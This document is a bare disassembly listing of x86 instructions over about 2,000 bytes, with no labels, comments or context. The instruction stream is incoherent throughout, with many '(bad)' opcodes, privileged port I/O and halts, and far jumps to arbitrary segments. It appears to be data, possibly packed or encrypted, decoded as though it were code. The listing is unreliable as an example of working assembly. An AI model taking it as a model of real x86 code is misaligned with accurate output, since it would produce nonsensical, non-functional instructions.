  402a4d:	enter  0x891e,0xf
  402a51:	inc    edi
  402a52:	jb     0x402a76
  402a54:	sbb    BYTE PTR [eax],0x1a
  402a57:	or     DWORD PTR [ecx+0x27],ebx
  402a5a:	xchg   esp,eax
  402a5b:	cli    
  402a5c:	rcl    BYTE PTR [ebp-0xa],1
  402a5f:	mov    dl,0xc9
  402a61:	xchg   esi,eax
  402a62:	test   eax,0x640a31c8
  402a67:	clc    
  402a68:	js     0x402adf
  402a6a:	or     BYTE PTR [edx-0x73],0x8c
  402a6e:	inc    edx
  402a6f:	cmp    BYTE PTR [edx-0x59a309b5],al
  402a75:	push   0xd2b40a39
  402a7a:	jbe    0x402a4a
  402a7c:	ins    DWORD PTR es:[edi],dx
  402a7d:	mov    dh,0xcc
  402a7f:	sbb    eax,0xd8925e6b
  402a84:	xor    dh,BYTE PTR [ecx]
  402a86:	es out 0x1b,al
  402a89:	es sub esi,ecx
  402a8c:	sub    DWORD PTR [ebp-0x44],0x34a9fe6f
  402a93:	jns    0x402ae5
  402a95:	(bad)  
  402a97:	repnz pop ebx
  402a99:	(bad)  
  402a9a:	pop    ecx
  402a9b:	inc    DWORD PTR ds:0x73ec2733
  402aa1:	lds    ecx,FWORD PTR [esp+eiz*8]
  402aa4:	inc    ecx
  402aa5:	int    0xe6
  402aa7:	dec    eax
  402aa8:	jmp    0x402ad3
  402aaa:	adc    al,BYTE PTR [ecx]
  402aac:	xor    cl,bl
  402aae:	inc    ebx
  402aaf:	jl     0x402b07
  402ab1:	loope  0x402ab2
  402ab3:	sub    BYTE PTR [ebx-0x5d],ah
  402ab6:	outs   dx,BYTE PTR cs:[esi]
  402ab8:	mov    edi,0xdd62194a
  402abd:	and    al,0xa6
  402abf:	aaa    
  402ac0:	jmp    0x402a99
  402ac2:	mov    bl,0xec
  402ac4:	rcl    ebx,0x18
  402ac7:	lea    eax,[esi+0x6492c828]
  402acd:	lahf   
  402ace:	and    al,ah
  402ad0:	out    dx,al
  402ad1:	jg     0x402ad8
  402ad3:	es xor al,0xc1
  402ad6:	test   DWORD PTR [esi],0x67ab0038
  402adc:	pop    ss
  402add:	jecxz  0x402ac4
  402adf:	add    bl,BYTE PTR [esp+ebp*2]
  402ae2:	in     eax,0xf6
  402ae4:	mov    cl,0xcc
  402ae6:	mov    dh,0xe4
  402ae8:	stos   BYTE PTR es:[edi],al
  402ae9:	cmc    
  402aea:	sub    ecx,edx
  402aec:	cmp    edi,ebp
  402aee:	call   0xfa5f:0x3cbf29e3
  402af5:	shr    BYTE PTR [ecx+ecx*2+0x1a],0x47
  402afa:	jp     0x402b57
  402afc:	inc    ebx
  402afd:	cmp    BYTE PTR [edx+0x70],0x1f
  402b01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b02:	(bad)  
  402b03:	and    esp,DWORD PTR [eax]
  402b05:	inc    ebx
  402b06:	hlt    
  402b07:	mov    edx,0xdbd6cb18
  402b0c:	mov    DWORD PTR [ebx-0x359e03d1],ebp
  402b12:	popa   
  402b13:	pushf  
  402b14:	pop    ecx
  402b15:	adc    BYTE PTR [esp+ebp*1-0x59fb9967],bh
  402b1c:	and    esi,DWORD PTR [esi+0x11]
  402b1f:	call   0x698d:0x59299dd1
  402b26:	repz add BYTE PTR [esp+esi*2],al
  402b2a:	jo     0x402b03
  402b2c:	dec    BYTE PTR [edi+eax*1-0x7d]
  402b30:	mov    dl,0xa2
  402b32:	in     al,0x9e
  402b34:	jp     0x402bac
  402b36:	adc    BYTE PTR [edi+eiz*8-0x59],bl
  402b3a:	add    eax,0x3a84fa3f
  402b3f:	loopne 0x402b21
  402b41:	mov    gs,edi
  402b43:	inc    edx
  402b44:	ds (bad) 
  402b46:	je     0x402b2f
  402b48:	jnp    0x402b62
  402b4a:	add    al,0xf9
  402b4c:	clc    
  402b4d:	mov    ecx,0x24c003e5
  402b52:	sbb    bl,bl
  402b54:	aas    
  402b55:	cwde   
  402b56:	das    
  402b57:	push   cs
  402b58:	ja     0x402b06
  402b5a:	adc    esi,esi
  402b5c:	or     bl,BYTE PTR [eax]
  402b5e:	cmp    dh,dh
  402b60:	loop   0x402bc8
  402b62:	sub    ebx,ebx
  402b64:	and    DWORD PTR [ebp-0x73],0x2bddd2bd
  402b6b:	dec    eax
  402b6c:	lods   eax,DWORD PTR ds:[esi]
  402b6d:	pop    edi
  402b6e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b70:	or     BYTE PTR [esi+0x4db9cd48],al
  402b76:	sti    
  402b77:	jo     0x402b3e
  402b79:	arpl   WORD PTR gs:[esi-0x4320cbca],dx
  402b80:	push   ebp
  402b81:	inc    ecx
  402b82:	xlat   BYTE PTR ds:[ebx]
  402b83:	mov    edx,0x2bcdfe2d
  402b88:	outs   dx,DWORD PTR ds:[esi]
  402b89:	inc    eax
  402b8a:	xchg   DWORD PTR [ebp-0x5b1b7a77],ecx
  402b90:	inc    ebx
  402b91:	mov    bh,0xc7
  402b93:	inc    esi
  402b94:	push   0x573f1cf6
  402b99:	push   edi
  402b9a:	nop
  402b9b:	adc    al,0xd9
  402b9d:	sbb    DWORD PTR [ecx+0x3b8c1925],esp
  402ba3:	add    eax,0xb0e9658b
  402ba8:	jae    0x402b49
  402baa:	inc    esp
  402bab:	cdq    
  402bac:	push   0x7113afaa
  402bb1:	sahf   
  402bb2:	sub    esi,DWORD PTR ds:0xfe17157f
  402bb8:	cmp    al,0x1f
  402bba:	mov    esp,0x326f9da0
  402bbf:	push   cs
  402bc0:	not    DWORD PTR [ebx+ebx*2]
  402bc3:	and    DWORD PTR [edi+0x47e65c48],edx
  402bc9:	sub    eax,0x20377830
  402bce:	fnsave [esi+0x197b9d0f]
  402bd4:	mov    edi,0x83192003
  402bd9:	dec    ebx
  402bda:	das    
  402bdb:	retf   0xcf82
  402bde:	sbb    BYTE PTR [ecx],ch
  402be0:	test   DWORD PTR [edi+0x17d2f4a0],eax
  402be6:	ins    BYTE PTR es:[edi],dx
  402be7:	xor    DWORD PTR [ebp+0x52],0xd3a3ae5d
  402bee:	mov    dh,0x63
  402bf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bf1:	lods   al,BYTE PTR ds:[esi]
  402bf2:	push   ebp
  402bf3:	stc    
  402bf4:	add    DWORD PTR [ecx],ecx
  402bf6:	js     0x402c18
  402bf8:	imul   eax,DWORD PTR [edi],0xf36165ad
  402bfe:	aaa    
  402bff:	jmp    0x402ba4
  402c01:	mov    bh,0x94
  402c03:	arpl   sp,bp
  402c05:	iret   
  402c06:	mov    dh,0xc4
  402c08:	mov    cl,BYTE PTR [eax-0x1a35e53f]
  402c0e:	cmp    eax,0xde2b4c2c
  402c13:	adc    ecx,esi
  402c15:	push   ebp
  402c16:	inc    edx
  402c17:	push   edi
  402c18:	lods   eax,DWORD PTR ds:[esi]
  402c19:	jne    0x402be8
  402c1b:	push   ss
  402c1c:	push   cs
  402c1d:	rcl    DWORD PTR [ecx+0x4e],cl
  402c20:	loopne 0x402c48
  402c22:	cs repz addr16 in al,dx
  402c26:	sub    ch,ch
  402c28:	inc    ebx
  402c29:	test   BYTE PTR ds:0x600a1e6e,0x50
  402c30:	sbb    eax,DWORD PTR [ecx]
  402c32:	leave  
  402c33:	call   0xc8e5:0x5c0c06a6
  402c3a:	das    
  402c3b:	or     al,BYTE PTR [ecx+0x3d1dc432]
  402c41:	pop    ds
  402c42:	mov    al,ds:0xd925c128
  402c47:	enter  0x20e1,0x3f
  402c4b:	ins    DWORD PTR es:[edi],dx
  402c4c:	xor    DWORD PTR [esi-0x70],esp
  402c4f:	in     al,0x4b
  402c51:	ret    
  402c52:	popa   
  402c53:	lods   al,BYTE PTR ds:[esi]
  402c54:	out    0x7e,al
  402c56:	mov    al,0xc6
  402c58:	rcl    ch,0x1f
  402c5b:	fsub   QWORD PTR [ebp+ebx*4+0x62]
  402c5f:	pop    ebx
  402c60:	cld    
  402c61:	jle    0x402c04
  402c63:	jmp    0x1d08389b
  402c68:	push   edi
  402c69:	mov    dh,ch
  402c6b:	out    0xb4,al
  402c6d:	mov    ds:0xee35301a,eax
  402c72:	sbb    DWORD PTR ds:0x600b9f26,ecx
  402c78:	jmp    0x9236:0xb771c1b1
  402c7f:	aad    0x4
  402c81:	jecxz  0x402c5a
  402c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c84:	sbb    eax,0xbbe9a61f
  402c89:	jcxz   0x402cfa
  402c8c:	and    DWORD PTR ds:0x3274503b,0x351ef3ba
  402c96:	popa   
  402c97:	add    BYTE PTR [edx+0x1c],dl
  402c9a:	xchg   esp,eax
  402c9b:	and    BYTE PTR [edi],ah
  402c9d:	outs   dx,BYTE PTR ds:[esi]
  402c9e:	pop    eax
  402c9f:	or     bh,BYTE PTR [esi+ecx*8]
  402ca2:	or     ebp,DWORD PTR [ecx-0x62f18224]
  402ca8:	sti    
  402ca9:	xor    ch,BYTE PTR [edx+0x4ab2f026]
  402caf:	mov    cl,0xf1
  402cb1:	and    DWORD PTR [eax],eax
  402cb3:	mov    ch,BYTE PTR [ebp-0x26]
  402cb6:	jns    0x402d11
  402cb8:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cba:	cdq    
  402cbb:	push   0x75
  402cbd:	mov    dl,0x6d
  402cbf:	xchg   eax,edx
  402cc1:	mov    edi,DWORD PTR [ebx-0x2f]
  402cc4:	push   ss
  402cc5:	sub    eax,0xcb542ee7
  402cca:	aad    0xa3
  402ccc:	ret    0x5ec5
  402ccf:	mov    cl,0xc9
  402cd1:	pop    eax
  402cd2:	test   DWORD PTR [eax],esp
  402cd4:	adc    esi,ebp
  402cd6:	mov    eax,0x4d99ed6b
  402cdb:	(bad)  
  402cdc:	and    al,BYTE PTR [ebp-0x5b]
  402cdf:	dec    ebx
  402ce0:	cwde   
  402ce1:	push   esi
  402ce2:	sahf   
  402ce3:	imul   eax,DWORD PTR [esi+0x37],0xae49a3c5
  402cea:	push   esp
  402ceb:	fdivr  st(0),st
  402ced:	ror    BYTE PTR [edx+edx*8],0x28
  402cf1:	mov    ebp,0xe3307a87
  402cf6:	push   ebp
  402cf7:	pop    ecx
  402cf8:	sbb    esi,DWORD PTR [esp+esi*4+0xbc8033b]
  402cff:	mov    edx,0x68044863
  402d04:	cli    
  402d05:	test   BYTE PTR [esi+edi*2+0x1c],0xea
  402d0a:	cs push es
  402d0c:	test   al,0x2c
  402d0e:	aas    
  402d0f:	(bad)  
  402d10:	loope  0x402ca5
  402d12:	cmp    cl,ch
  402d14:	cmp    al,0x8c
  402d16:	dec    ebx
  402d17:	xchg   edi,eax
  402d18:	push   ss
  402d19:	(bad)  
  402d1a:	call   0x3e1d:0x7b504744
  402d21:	ss loop 0x402d9d
  402d24:	mov    eax,ds:0x30f14f6f
  402d29:	mov    ah,0xdb
  402d2b:	out    dx,al
  402d2c:	popf   
  402d2d:	sub    bl,BYTE PTR [esi]
  402d2f:	ja     0x402cf4
  402d31:	xor    BYTE PTR [ebx+esi*1],dh
  402d34:	fst    DWORD PTR [esi+eiz*8]
  402d37:	repnz dec ebp
  402d39:	aad    0x10
  402d3b:	rcl    ebp,cl
  402d3d:	dec    ecx
  402d3e:	test   eax,0x425450f4
  402d43:	(bad)  
  402d44:	imul   esi
  402d46:	xchg   edi,eax
  402d47:	dec    ebp
  402d48:	inc    eax
  402d49:	iret   
  402d4a:	inc    ecx
  402d4b:	add    ebp,DWORD PTR ds:0xbc9d1eb3
  402d51:	(bad)
  402d54:	xchg   BYTE PTR [ecx+0x11],al
  402d57:	xchg   DWORD PTR [edi-0x1a8a1b7f],ecx
  402d5d:	mov    ebp,edx
  402d5f:	adc    DWORD PTR [ecx],0xd4e7057
  402d65:	pop    ecx
  402d66:	mov    eax,0x5975143
  402d6b:	(bad)  
  402d6c:	jle    0x402d3e
  402d6e:	mov    al,ds:0xe640bf0
  402d73:	ja     0x402ddc
  402d75:	das    
  402d76:	outs   dx,BYTE PTR ds:[esi]
  402d77:	xchg   ebp,eax
  402d78:	sbb    DWORD PTR [ebp-0xe],0x67499d81
  402d7f:	enter  0xe9ee,0x83
  402d83:	xchg   ebp,eax
  402d84:	test   ch,al
  402d86:	bound  esp,QWORD PTR [esi+eax*4+0x31]
  402d8a:	ret    
  402d8b:	repz add BYTE PTR [edi],ah
  402d8e:	cdq    
  402d8f:	dec    ebx
  402d90:	inc    eax
  402d91:	push   ebx
  402d92:	cmp    al,0xcc
  402d94:	pop    ss
  402d95:	int    0x3b
  402d97:	loope  0x402ddf
  402d99:	pop    ss
  402d9a:	sbb    BYTE PTR [esi-0xd],0xc7
  402d9e:	dec    ebx
  402d9f:	xchg   DWORD PTR [ebx],ecx
  402da1:	ins    BYTE PTR es:[edi],dx
  402da2:	loope  0x402dfb
  402da4:	or     al,0x1a
  402da6:	lods   al,BYTE PTR ds:[esi]
  402da7:	xchg   esi,eax
  402da8:	(bad)  
  402daa:	jae    0x402d8a
  402dac:	mov    eax,0x8118ec6e
  402db1:	ret    
  402db2:	int    0x8
  402db4:	dec    esp
  402db5:	add    al,0x43
  402db7:	pop    ds
  402db8:	pop    esp
  402db9:	push   es
  402dba:	rcl    BYTE PTR [eax+eax*4],cl
  402dbd:	ins    DWORD PTR es:[edi],dx
  402dbe:	dec    eax
  402dbf:	loope  0x402dcc
  402dc1:	es popa 
  402dc3:	fidivr WORD PTR [esi-0x78]
  402dc6:	fbstp  TBYTE PTR [eax]
  402dc8:	outs   dx,DWORD PTR ds:[esi]
  402dc9:	add    cl,BYTE PTR [edi]
  402dcb:	(bad)  
  402dcc:	repnz into 
  402dce:	loop   0x402e35
  402dd0:	adc    DWORD PTR [esi-0x5f],0x4ce5b991
  402dd7:	pop    ss
  402dd8:	test   al,0xed
  402dda:	sbb    esp,DWORD PTR ds:[eax]
  402ddd:	sbb    al,0x6c
  402ddf:	xchg   al,ch
  402de1:	loop   0x402d76
  402de3:	xor    eax,0x2540a9e8
  402de8:	xchg   ecx,eax
  402de9:	mov    dh,0x3
  402deb:	fild   QWORD PTR [esi-0xb4a23ac]
  402df1:	ret    0x88a6
  402df4:	adc    ebp,ebp
  402df6:	and    bh,bl
  402df8:	jmp    0xd5dc:0x95553722
  402dff:	pop    esp
  402e00:	adc    eax,0xb4dc2096
  402e05:	lock sar DWORD PTR [edx+eax*8-0x21ca960f],cl
  402e0d:	inc    ebx
  402e0e:	jmp    0x4318:0xcef38c24
  402e15:	into   
  402e16:	inc    esp
  402e17:	push   0xefad3a75
  402e1c:	mov    bh,0x98
  402e1e:	jbe    0x402e13
  402e20:	and    eax,0x46cf445b
  402e25:	arpl   WORD PTR [ebp+0x7c],sp
  402e28:	add    dh,BYTE PTR [ecx-0x3a]
  402e2b:	jle    0x402e74
  402e2d:	jnp    0x402db3
  402e2f:	adc    al,0xec
  402e31:	int3   
  402e32:	enter  0x573c,0xab
  402e36:	dec    esi
  402e37:	es pop ebp
  402e39:	cmp    BYTE PTR [edi],bl
  402e3b:	inc    esp
  402e3c:	xlat   BYTE PTR ds:[ebx]
  402e3d:	(bad)  
  402e3f:	test   DWORD PTR [ebp+edx*8+0x77],esp
  402e43:	mov    eax,0x3ac41890
  402e48:	jmp    0x938d8c58
  402e4d:	(bad)  
  402e4e:	(bad)  
  402e4f:	in     al,0x7f
  402e51:	dec    DWORD PTR [edx]
  402e53:	test   esp,ebp
  402e55:	inc    ecx
  402e56:	or     DWORD PTR [eax],ebx
  402e58:	pop    ebp
  402e59:	mov    dh,0x4b
  402e5b:	pusha  
  402e5c:	vfnmsub231ps xmm0{k6}{z},xmm2,DWORD PTR [edx+0x2dcaa23e]{1to4}
  402e66:	js     0x402e19
  402e68:	pusha  
  402e69:	popa   
  402e6a:	gs pusha 
  402e6c:	mov    eax,ds:0xd8b3ab43
  402e71:	lahf   
  402e72:	shl    BYTE PTR [edi+0x71],1
  402e75:	cmp    eax,0xa4eabf7c
  402e7a:	push   edx
  402e7b:	das    
  402e7c:	jns    0x402ef5
  402e7e:	nop
  402e7f:	cdq    
  402e80:	pop    eax
  402e81:	dec    edx
  402e82:	adc    cl,BYTE PTR ss:[edx-0x15]
  402e86:	inc    ebp
  402e87:	mov    al,0x7c
  402e89:	repnz pop esp
  402e8b:	mov    al,cl
  402e8d:	adc    bh,BYTE PTR [esi+0x34]
  402e90:	cmp    eax,0x970e7210
  402e95:	ret    0x5588
  402e98:	adc    DWORD PTR ss:[edi],0x36
  402e9c:	inc    ecx
  402e9d:	mov    WORD PTR [ebp+0x5a],?
  402ea0:	je     0x402e63
  402ea2:	xchg   esi,esp
  402ea4:	(bad)  
  402ea5:	mov    ch,0xb4
  402ea7:	jae    0x402ee5
  402ea9:	call   edi
  402eab:	push   cs
  402eac:	shr    BYTE PTR [esi-0x4c],1
  402eaf:	mov    cl,0x60
  402eb1:	out    0x4b,eax
  402eb3:	or     eax,0x7218a06e
  402eb8:	jl     0x402ea2
  402eba:	mov    edi,0xec3e5566
  402ebf:	dec    ebx
  402ec0:	adc    BYTE PTR [ebx-0x57c24d73],dh
  402ec6:	jmp    0x148ba44
  402ecb:	sbb    DWORD PTR [ebp+eax*8+0x22],ebp
  402ecf:	inc    ebx
  402ed0:	pop    ebp
  402ed1:	mov    al,0x16
  402ed3:	cmp    BYTE PTR [ebx],ah
  402ed5:	xor    DWORD PTR [eax],eax
  402ed7:	lahf   
  402ed8:	(bad)  
  402ed9:	push   eax
  402eda:	and    DWORD PTR [edx+0x16],0xf5e606d7
  402ee1:	cmc    
  402ee2:	das    
  402ee3:	retf   
  402ee4:	mov    bl,0xce
  402ee6:	in     al,dx
  402ee7:	pop    edx
  402ee8:	or     DWORD PTR [ebp-0x3],0x69109004
  402eef:	aad    0x15
  402ef1:	fst    QWORD PTR [ebp+0x69]
  402ef4:	mov    dh,0x9e
  402ef6:	(bad)  
  402ef7:	in     eax,0xeb
  402ef9:	stc    
  402efa:	inc    edi
  402efb:	jae    0x402eb4
  402efd:	adc    BYTE PTR [esi+ebp*8],ch
  402f00:	mov    ss,WORD PTR [eax]
  402f02:	int    0xff
  402f04:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  402f06:	sub    edx,ecx
  402f08:	pop    ebx
  402f09:	push   edx
  402f0a:	repnz ror BYTE PTR [esi+0x329142a4],cl
  402f11:	nop
  402f12:	xchg   BYTE PTR [edi-0x4f],ah
  402f15:	js     0x402f75
  402f17:	mov    edi,esp
  402f19:	sbb    esi,DWORD PTR [edi-0x4f99851e]
  402f1f:	push   0xc71c2974
  402f24:	xchg   esp,eax
  402f25:	sbb    ebx,edx
  402f27:	shl    BYTE PTR [esi+0x2b97721b],cl
  402f2d:	add    dh,BYTE PTR [edx+0x70]
  402f30:	sbb    BYTE PTR [edi],cl
  402f32:	mov    ds:0x49c4741d,al
  402f37:	popa   
  402f38:	jecxz  0x402ee7
  402f3a:	scas   eax,DWORD PTR es:[edi]
  402f3b:	mov    ?,edi
  402f3d:	in     al,0xd
  402f3f:	jmp    0x402efe
  402f41:	or     dh,dl
  402f43:	jmp    0x402f31
  402f45:	psrld  mm0,mm4
  402f48:	hlt    
  402f49:	sub    eax,0x60e4f4b0
  402f4e:	pop    ds
  402f4f:	scas   eax,DWORD PTR es:[edi]
  402f50:	push   edi
  402f51:	and    al,0x4d
  402f53:	in     eax,0x2f
  402f55:	jae    0x402f75
  402f57:	inc    ebp
  402f58:	stc    
  402f59:	mov    DWORD PTR [edi-0x3e87ae43],eax
  402f5f:	je     0x402efa
  402f61:	pop    ebx
  402f62:	lock jg 0x402f92
  402f65:	repz aas 
  402f67:	xor    al,0x7c
  402f69:	ret    0x850f
  402f6c:	ja     0x402fa1
  402f6e:	icebp  
  402f6f:	sahf   
  402f70:	call   0x5bea:0x8324935c
  402f77:	sbb    ebp,esp
  402f79:	jae    0x402f8f
  402f7b:	icebp  
  402f7c:	in     eax,0x2f
  402f7e:	mov    ebx,0x3c30b6f5
  402f83:	push   ebp
  402f84:	jb     0x402fbb
  402f86:	ret    
  402f87:	cmp    ch,bh
  402f89:	sub    eax,0x4f8fb940
  402f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f8f:	add    al,0x44
  402f91:	mov    BYTE PTR [edx+edi*4-0x1e],ah
  402f95:	adc    DWORD PTR [eax],esi
  402f97:	ss lahf 
  402f99:	repz xchg edi,eax
  402f9b:	loope  0x402ff5
  402f9d:	hlt    
  402f9e:	jl     0x402fa0
  402fa0:	ret    
  402fa1:	push   eax
  402fa2:	pop    ds
  402fa3:	jmp    0x403003
  402fa5:	repz jno 0x402f9e
  402fa8:	sbb    DWORD PTR [ebx-0x4d],0x9de4cc70
  402faf:	aaa    
  402fb0:	iret   
  402fb1:	out    0xf6,eax
  402fb3:	cmp    BYTE PTR [edi+0x68],cl
  402fb6:	aad    0xe6
  402fb8:	adc    eax,esi
  402fba:	sbb    bl,BYTE PTR [ebx+edi*8+0x6c]
  402fbe:	jmp    0xb28704ca
  402fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc4:	daa    
  402fc5:	lock (bad) 
  402fc7:	call   0xad4232fc
  402fcc:	js     0x402f7c
  402fce:	sahf   
  402fcf:	inc    edx
  402fd0:	pop    eax
  402fd1:	cld    
  402fd2:	cmp    eax,DWORD PTR [eax]
  402fd4:	jp     0x403004
  402fd6:	call   0xa2f5:0xdbe63924
  402fdd:	test   esi,eax
  402fdf:	or     DWORD PTR [ebp-0x42],0x46
  402fe3:	and    al,0xcc
  402fe5:	ficom  DWORD PTR [edi]
  402fe7:	rcl    BYTE PTR ds:0x238b9b3f,cl
  402fed:	lock lock ret 
  402ff0:	clc    
  402ff1:	ins    DWORD PTR es:[edi],dx
  402ff2:	call   0x71d1:0x37814cbd
  402ff9:	xor    eax,0x951b67ed
  402ffe:	adc    DWORD PTR [ebp-0x9e2af56],ecx
  403004:	clc    
  403005:	lods   eax,DWORD PTR ds:[esi]
  403006:	clc    
  403007:	lods   al,BYTE PTR ds:[esi]
  403008:	inc    eax
  403009:	hlt    
  40300a:	jmp    0x91cd1791
  40300f:	jg     0x40300c
  403011:	cmp    edi,eax
  403013:	mov    dh,0x90
  403015:	adc    cl,cl
  403017:	stos   BYTE PTR es:[edi],al
  403018:	out    0xfb,eax
  40301a:	retf   
  40301b:	scas   eax,DWORD PTR es:[edi]
  40301c:	xor    cl,BYTE PTR [edi+ecx*2-0x68225711]
  403023:	inc    esp
  403024:	pop    ds
  403025:	ror    al,1
  403027:	xor    eax,0xbc8c6231
  40302c:	jmp    0x95bbd34e
  403031:	pop    ecx
  403032:	sub    DWORD PTR [edx],edx
  403034:	push   ss
  403035:	or     eax,0x60544533
  40303a:	(bad)  
  40303b:	jmp    0x40302a
  40303d:	test   eax,0x9ee98c86
  403042:	inc    BYTE PTR [ebx]
  403044:	fwait
  403045:	dec    esi
  403046:	enter  0xcf09,0x6b
  40304a:	sti    
  40304b:	dec    ebx
  40304c:	stos   DWORD PTR es:[edi],eax
  40304d:	xor    bh,ah
  40304f:	sub    BYTE PTR [esi*1-0x1643bf1],al
  403056:	arpl   si,dx
  403058:	fst    QWORD PTR [ecx-0x39ea88b5]
  40305e:	xchg   edi,eax
  40305f:	stc    
  403060:	out    0xc5,eax
  403062:	cmp    cl,cl
  403064:	mov    ch,0xe4
  403066:	into   
  403067:	push   ecx
  403068:	jne    0x4030e5
  40306a:	pushf  
  40306b:	add    ecx,eax
  40306d:	xchg   ebp,eax
  40306e:	repnz mov al,0xd
  403071:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  403073:	in     eax,0xda
  403075:	jg     0x4030da
  403077:	sub    BYTE PTR [ebp-0x2d],ah
  40307a:	mov    dl,0x4a
  40307c:	adc    al,0x98
  40307e:	adc    BYTE PTR [edi],al
  403080:	push   edx
  403081:	jge    0x403035
  403083:	or     BYTE PTR [esi-0x79],0x1d
  403087:	aad    0x28
  403089:	push   ecx
  40308a:	ja     0x403063
  40308c:	fdivr  QWORD PTR [ebx-0x33]
  40308f:	jmp    DWORD PTR [esi+0x1f]
  403092:	arpl   WORD PTR [ebx],cx
  403094:	jns    0x403019
  403096:	sub    eax,0x5e550822
  40309b:	popf   
  40309c:	jo     0x4030bb
  40309e:	or     BYTE PTR [ebx],bh
  4030a0:	mov    al,ds:0xb1311ad1
  4030a5:	xchg   BYTE PTR [edx],ah
  4030a7:	ret    
  4030a8:	test   eax,0xcc6b8b5f
  4030ad:	out    dx,al
  4030ae:	jne    0x4030d8
  4030b0:	lods   eax,DWORD PTR ds:[esi]
  4030b1:	fs jo  0x40307d
  4030b4:	pop    esi
  4030b5:	xchg   ecx,eax
  4030b6:	int    0x49
  4030b8:	(bad)  
  4030b9:	mov    esi,0x8bd7270b
  4030be:	inc    edx
  4030bf:	dec    edi
  4030c0:	out    dx,eax
  4030c1:	int3   
  4030c2:	int    0x67
  4030c4:	push   ebp
  4030c5:	inc    ecx
  4030c6:	popf   
  4030c7:	icebp  
  4030c8:	jp     0x403101
  4030ca:	sbb    eax,0x935c5b3f
  4030cf:	ret    
  4030d0:	mov    esi,0x8a481a82
  4030d5:	pop    ecx
  4030d6:	pop    ds
  4030d7:	addr16 sub eax,0x8f8aa348
  4030dd:	and    cl,ch
  4030df:	pop    esi
  4030e0:	lods   al,BYTE PTR ds:[esi]
  4030e1:	shl    BYTE PTR [edx-0x42],1
  4030e4:	sub    dl,cl
  4030e6:	adc    cl,bh
  4030e8:	mov    ds:0xc53b538f,al
  4030ed:	xor    eax,DWORD PTR [edx+0x3b]
  4030f0:	inc    edx
  4030f1:	mov    fs,WORD PTR [ebx+edx*1]
  4030f4:	add    eax,0x2a52a4df
  4030f9:	jmp    0xca3891fc
  4030fe:	add    DWORD PTR [ebp+esi*4-0x22b99719],esi
  403105:	mov    al,ds:0x6dbac716
  40310a:	mov    eax,0xcd7ce4fe
  40310f:	out    dx,eax
  403110:	push   0xe70e8268
  403115:	push   ecx
  403116:	adc    ebx,DWORD PTR [ebx-0x44335cd]
  40311c:	xchg   ebx,eax
  40311d:	hlt    
  40311e:	xchg   edi,eax
  40311f:	fidivr DWORD PTR [ecx+ebp*8-0x1a]
  403124:	fs inc edx
  403126:	jmp    0xd0d6:0xcc8bab48
  40312d:	adc    dl,cl
  40312f:	int    0xea
  403131:	lods   al,BYTE PTR ds:[esi]
  403132:	mov    eax,0x8d902430
  403137:	add    eax,0x9f187a91
  40313c:	xchg   DWORD PTR ds:0xe594c9c4,edx
  403142:	sub    al,0xc7
  403144:	out    0xfd,eax
  403146:	call   0x6d34:0x4be55787
  40314d:	sub    edx,esp
  40314f:	nop
  403150:	push   ebp
  403151:	cli    
  403152:	mov    cl,cl
  403154:	add    eax,0xc32f6efb
  403159:	add    al,0xdb
  40315b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40315c:	push   eax
  40315d:	(bad)  [edi]
  40315f:	jnp    0x403116
  403161:	jo     0x403104
  403163:	ficomp DWORD PTR [ebx+ebp*2-0x7326c58f]
  40316a:	aaa    
  40316b:	sub    BYTE PTR [eax-0x72],0x4f
  40316f:	sbb    bl,BYTE PTR [edx+0xedd8f85]
  403175:	cmp    al,0xe9
  403177:	bound  edx,QWORD PTR [edx]
  403179:	push   ecx
  40317a:	sub    DWORD PTR [edx+0x32fa4038],0xe0ba7f74
  403184:	data16 ja 0x4031b0
  403187:	and    al,0xaf
  403189:	inc    ebx
  40318a:	dec    ecx
  40318b:	popa   
  40318c:	leave  
  40318d:	lods   al,BYTE PTR ds:[esi]
  40318e:	push   ss
  40318f:	sbb    ah,cl
  403191:	pop    ds
  403192:	and    al,0x5c
  403194:	pop    edx
  403195:	add    ah,BYTE PTR [esi]
  403197:	or     dl,BYTE PTR [esi-0x1c]
  40319a:	out    0x4d,eax
  40319c:	hlt    
  40319d:	in     eax,0x26
  40319f:	stos   BYTE PTR es:[edi],al
  4031a0:	mov    esp,0xaf854f36
  4031a5:	(bad)
  4031a9:	mov    BYTE PTR [ebx+edi*4+0x57],al
  4031ad:	(bad)  
  4031af:	mov    esp,DWORD PTR [edx-0x6905fe6c]
  4031b5:	(bad)  
  4031b6:	jle    0x40319b
  4031b8:	dec    esp
  4031b9:	inc    esp
  4031ba:	and    eax,0x399a83ba
  4031bf:	add    eax,0x4caa85ee
  4031c4:	daa    
  4031c5:	call   0x4a3e:0x5fdb0961
  4031cc:	lds    esp,FWORD PTR [edx-0x7cc119ae]
  4031d2:	or     eax,0x25bde0a6
  4031d7:	inc    edx
  4031d8:	jns    0x403225
  4031da:	push   ds
  4031db:	sti    
  4031dc:	cli    
  4031dd:	gs jnp 0x403173
  4031e0:	rcl    esi,1
  4031e2:	cli    
  4031e3:	or     DWORD PTR [edx+eax*8+0x22],esi
  4031e7:	mov    bh,0xf3
  4031e9:	ins    BYTE PTR es:[edi],dx
  4031ea:	cwde   
  4031eb:	mov    ecx,0xa64f407c
  4031f0:	ja     0x4031ff
  4031f2:	pop    ss
  4031f3:	sub    BYTE PTR [ecx+0x45],0xa6
  4031f7:	dec    ecx
  4031f8:	mov    ds:0x32a2f1ad,eax
  4031fd:	xchg   ebx,eax
  4031fe:	jecxz  0x403253
  403200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403201:	add    esp,edx
  403203:	xor    ebp,DWORD PTR [ebp+0x5438f7b9]
  403209:	popa   
  40320a:	sti    
  40320b:	hlt    
  40320c:	call   0xe0a133e1
  403211:	bound  ecx,QWORD PTR ds:0xf1169f71
  403217:	das    
  403218:	mov    dh,0x71
  40321a:	jle    0x403286
  40321c:	dec    edi
  40321d:	(bad)  
  40321e:	jecxz  0x403234
  403220:	ss das 
